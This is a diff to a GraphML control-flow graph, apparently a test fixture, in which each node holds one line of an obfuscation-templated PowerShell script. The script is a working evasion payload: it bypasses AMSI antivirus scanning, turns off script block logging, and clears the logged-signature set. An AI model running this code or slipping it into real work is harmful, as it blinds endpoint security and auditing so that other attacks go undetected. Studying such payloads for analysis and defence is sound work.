@@ -8,142 +8,167 @@
   <key id="instruction.source" for="node" attr.name="instruction.source" attr.type="string"/>
   <key id="instruction.hex" for="node" attr.name="instruction.hex" attr.type="string"/>
   <graph edgedefault="directed">
-    <data key="address">0</data>
-    <data key="type">block</data>
-    <node id="block:instruction.1">
+    <node id="block.1">
       <data key="address">1</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">If($PSVersionTable.PSVersion.Major -ge 3){</data>
+      <data key="type">block</data>
+      <graph edgedefault="directed">
+        <data key="address">1</data>
+        <data key="type">block</data>
+        <node id="block.1:instruction.1">
+          <data key="address">1</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">If($PSVersionTable.PSVersion.Major -ge 3){</data>
+        </node>
+        <node id="block.1:instruction.2">
+          <data key="address">2</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    $val=[Collections.Generic.Dictionary[string,System.Object]]::new();</data>
+        </node>
+        <node id="block.1:instruction.3">
+          <data key="address">3</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    $Ref1=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.AmsiUtils') %&gt;);</data>
+        </node>
+        <node id="block.1:instruction.4">
+          <data key="address">4</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    $Ref1.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('amsiInitFailed') %&gt;,'NonPublic,Static').SetValue($null,$true);</data>
+        </node>
+        <node id="block.1:instruction.5">
+          <data key="address">5</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    $Ref2=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.Utils') %&gt;);</data>
+        </node>
+        <node id="block.1:instruction.6">
+          <data key="address">6</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    $GPF=$Ref2.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('cachedGroupPolicySettings') %&gt;,'NonPublic,Static');</data>
+        </node>
+        <node id="block.1:instruction.7">
+          <data key="address">7</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    If ($GPF) {</data>
+        </node>
+        <node id="block.1:instruction.8">
+          <data key="address">8</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        $SBL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('ScriptBlockLogging') %&gt;;</data>
+        </node>
+        <node id="block.1:instruction.9">
+          <data key="address">9</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        $EnableSBL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('EnableScriptBlockLogging') %&gt;;</data>
+        </node>
+        <node id="block.1:instruction.10">
+          <data key="address">10</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        $EnableSBIL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('EnableScriptBlockInvocationLogging') %&gt;;</data>
+        </node>
+        <node id="block.1:instruction.11">
+          <data key="address">11</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        $GPC=$GPF.GetValue($null);</data>
+        </node>
+        <edge source="block.1:instruction.1" target="block.1:instruction.3"/>
+        <edge source="block.1:instruction.1" target="block.1:instruction.5"/>
+        <edge source="block.1:instruction.3" target="block.1:instruction.4"/>
+        <edge source="block.1:instruction.4" target="block.1:instruction.7"/>
+        <edge source="block.1:instruction.5" target="block.1:instruction.6"/>
+        <edge source="block.1:instruction.6" target="block.1:instruction.7"/>
+        <edge source="block.1:instruction.7" target="block.1:instruction.11"/>
+      </graph>
     </node>
-    <node id="block:instruction.2">
-      <data key="address">2</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">    $Ref1=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.AmsiUtils') %&gt;);</data>
-    </node>
-    <node id="block:instruction.3">
-      <data key="address">3</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">    $Ref1.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('amsiInitFailed') %&gt;,'NonPublic,Static').SetValue($null,$true);</data>
-    </node>
-    <node id="block:instruction.4">
-      <data key="address">4</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">    $Ref2=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.Utils') %&gt;);</data>
-    </node>
-    <node id="block:instruction.5">
-      <data key="address">5</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">    $GPF=$Ref2.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('cachedGroupPolicySettings') %&gt;,'NonPublic,Static');</data>
-    </node>
-    <node id="block:instruction.6">
-      <data key="address">6</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">    If ($GPF) {</data>
-    </node>
-    <node id="block:instruction.7">
-      <data key="address">7</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $SBL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('ScriptBlockLogging') %&gt;;</data>
-    </node>
-    <node id="block:instruction.8">
-      <data key="address">8</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $EnableSBL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('EnableScriptBlockLogging') %&gt;;</data>
-    </node>
-    <node id="block:instruction.9">
-      <data key="address">9</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $EnableSBIL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('EnableScriptBlockInvocationLogging') %&gt;;</data>
-    </node>
-    <node id="block:instruction.10">
-      <data key="address">10</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $GPC=$GPF.GetValue($null);</data>
-    </node>
-    <node id="block:instruction.11">
-      <data key="address">11</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        If($GPC[$SBL]){</data>
-    </node>
-    <node id="block:instruction.12">
+    <node id="block.12">
       <data key="address">12</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">            $GPC[$SBL][$EnableSBL]=0;</data>
+      <data key="type">block</data>
+      <graph edgedefault="directed">
+        <data key="address">12</data>
+        <data key="type">block</data>
+        <node id="block.12:instruction.12">
+          <data key="address">12</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        If($GPC[$SBL]){</data>
+        </node>
+        <node id="block.12:instruction.13">
+          <data key="address">13</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">            $GPC[$SBL][$EnableSBL]=0;</data>
+        </node>
+        <node id="block.12:instruction.14">
+          <data key="address">14</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">            $GPC[$SBL][$EnableSBIL]=0;</data>
+        </node>
+        <node id="block.12:instruction.15">
+          <data key="address">15</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        }</data>
+        </node>
+        <edge source="block.12:instruction.12" target="block.12:instruction.13"/>
+        <edge source="block.12:instruction.12" target="block.12:instruction.14"/>
+        <edge source="block.12:instruction.13" target="block.12:instruction.15"/>
+        <edge source="block.12:instruction.14" target="block.12:instruction.15"/>
+      </graph>
     </node>
-    <node id="block:instruction.13">
-      <data key="address">13</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">            $GPC[$SBL][$EnableSBIL]=0;</data>
-    </node>
-    <node id="block:instruction.14">
-      <data key="address">14</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        }</data>
-    </node>
-    <node id="block:instruction.15">
-      <data key="address">15</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $val=[Collections.Generic.Dictionary[string,System.Object]]::new();</data>
-    </node>
-    <node id="block:instruction.16">
+    <node id="block.16">
       <data key="address">16</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $val.Add($EnableSBL,0);</data>
+      <data key="type">block</data>
+      <graph edgedefault="directed">
+        <data key="address">16</data>
+        <data key="type">block</data>
+        <node id="block.16:instruction.16">
+          <data key="address">16</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        $val.Add($EnableSBL,0);</data>
+        </node>
+        <node id="block.16:instruction.17">
+          <data key="address">17</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        $val.Add($EnableSBIL,0);</data>
+        </node>
+        <node id="block.16:instruction.18">
+          <data key="address">18</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$SBL]=$val;</data>
+        </node>
+        <edge source="block.16:instruction.16" target="block.16:instruction.18"/>
+        <edge source="block.16:instruction.17" target="block.16:instruction.18"/>
+      </graph>
     </node>
-    <node id="block:instruction.17">
-      <data key="address">17</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $val.Add($EnableSBIL,0);</data>
-    </node>
-    <node id="block:instruction.18">
-      <data key="address">18</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$SBL]=$val;</data>
-    </node>
-    <node id="block:instruction.19">
+    <node id="block.19">
       <data key="address">19</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">    } Else {</data>
+      <data key="type">block</data>
+      <graph edgedefault="directed">
+        <data key="address">19</data>
+        <data key="type">block</data>
+        <node id="block.19:instruction.19">
+          <data key="address">19</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    } Else {</data>
+        </node>
+        <node id="block.19:instruction.20">
+          <data key="address">20</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">        [ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));</data>
+        </node>
+        <node id="block.19:instruction.21">
+          <data key="address">21</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">    }</data>
+        </node>
+        <node id="block.19:instruction.22">
+          <data key="address">22</data>
+          <data key="type">instruction</data>
+          <data key="instruction.source">}</data>
+        </node>
+        <edge source="block.19:instruction.19" target="block.19:instruction.20"/>
+        <edge source="block.19:instruction.20" target="block.19:instruction.21"/>
+        <edge source="block.19:instruction.21" target="block.19:instruction.22"/>
+      </graph>
     </node>
-    <node id="block:instruction.20">
-      <data key="address">20</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">        [ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));</data>
-    </node>
-    <node id="block:instruction.21">
-      <data key="address">21</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">    }</data>
-    </node>
-    <node id="block:instruction.22">
-      <data key="address">22</data>
-      <data key="type">instruction</data>
-      <data key="instruction.source">}</data>
-    </node>
-    <edge source="block:instruction.1" target="block:instruction.2"/>
-    <edge source="block:instruction.1" target="block:instruction.4"/>
-    <edge source="block:instruction.2" target="block:instruction.3"/>
-    <edge source="block:instruction.3" target="block:instruction.6"/>
-    <edge source="block:instruction.4" target="block:instruction.5"/>
-    <edge source="block:instruction.5" target="block:instruction.6"/>
-    <edge source="block:instruction.6" target="block:instruction.10"/>
-    <edge source="block:instruction.7" target="block:instruction.11"/>
-    <edge source="block:instruction.8" target="block:instruction.12"/>
-    <edge source="block:instruction.9" target="block:instruction.13"/>
-    <edge source="block:instruction.10" target="block:instruction.11"/>
-    <edge source="block:instruction.11" target="block:instruction.12"/>
-    <edge source="block:instruction.11" target="block:instruction.13"/>
-    <edge source="block:instruction.12" target="block:instruction.14"/>
-    <edge source="block:instruction.13" target="block:instruction.14"/>
-    <edge source="block:instruction.14" target="block:instruction.16"/>
-    <edge source="block:instruction.14" target="block:instruction.17"/>
-    <edge source="block:instruction.15" target="block:instruction.16"/>
-    <edge source="block:instruction.15" target="block:instruction.17"/>
-    <edge source="block:instruction.16" target="block:instruction.18"/>
-    <edge source="block:instruction.17" target="block:instruction.18"/>
-    <edge source="block:instruction.18" target="block:instruction.19"/>
-    <edge source="block:instruction.19" target="block:instruction.20"/>
-    <edge source="block:instruction.20" target="block:instruction.21"/>
-    <edge source="block:instruction.21" target="block:instruction.22"/>
+    <edge source="block.1" target="block.12"/>
+    <edge source="block.1" target="block.16"/>
+    <edge source="block.12" target="block.19"/>
+    <edge source="block.16" target="block.19"/>
   </graph>
 </graphml>
